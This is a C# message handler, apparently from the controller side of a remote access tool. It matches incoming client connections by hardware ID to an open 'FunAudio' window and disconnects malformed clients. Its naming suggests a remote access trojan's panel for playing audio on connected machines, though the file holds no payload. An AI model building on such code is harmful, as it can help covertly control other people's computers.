using System.Linq;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerFunAudio
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2)
		{
			client.Disconnect();
			return;
		}
		if (objects[1] == null || !(objects[1] is string))
		{
			client.Disconnect();
			return;
		}
		string command = (string)objects[1];
		if (command.Length > 100)
		{
			client.Disconnect();
		}
		else if (command == "Ready")
		{
			FormFunAudio form = null;
			string hwid = null;
			if (!string.IsNullOrEmpty(client.Hwid))
			{
				if (client.Hwid.Length > 100)
				{
					client.Disconnect();
					return;
				}
				form = (FormFunAudio)Application.OpenForms["FunAudio:" + client.Hwid];
				if (form != null)
				{
					hwid = client.Hwid;
				}
			}
			if (form == null)
			{
				foreach (Form openForm in Application.OpenForms)
				{
					if (!(openForm is FormFunAudio) || !openForm.Name.StartsWith("FunAudio:"))
					{
						continue;
					}
					FormFunAudio funAudioForm = (FormFunAudio)openForm;
					string formHwid = funAudioForm.parrent?.Hwid ?? "";
					if (funAudioForm.parrent == null)
					{
						continue;
					}
					bool match = false;
					if (funAudioForm.parrent == client)
					{
						match = true;
					}
					else if (!string.IsNullOrEmpty(formHwid))
					{
						if (formHwid.Length > 100)
						{
							continue;
						}
						if (!string.IsNullOrEmpty(client.Hwid))
						{
							if (client.Hwid.Length > 100)
							{
								continue;
							}
							match = formHwid == client.Hwid;
						}
						else if (Application.OpenForms.Cast<Form>().Count((Form f) => f is FormFunAudio && f.Name.StartsWith("FunAudio:")) == 1)
						{
							match = true;
						}
					}
					if (match)
					{
						form = funAudioForm;
						hwid = formHwid;
						if (!string.IsNullOrEmpty(hwid) && string.IsNullOrEmpty(client.Hwid))
						{
							client.Hwid = hwid;
						}
						break;
					}
				}
			}
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			if (string.IsNullOrEmpty(client.Hwid) && !string.IsNullOrEmpty(hwid))
			{
				if (hwid.Length > 100)
				{
					client.Disconnect();
					return;
				}
				client.Hwid = hwid;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.client = client;
				if (!string.IsNullOrEmpty(hwid))
				{
					form.Text = "FunAudio [" + hwid + "]";
				}
			});
			client.Tag = form;
		}
		else if (command == "Ping" && client.Tag == null)
		{
			client.Disconnect();
		}
		else if (command != "Ping")
		{
			client.Disconnect();
		}
	}
}
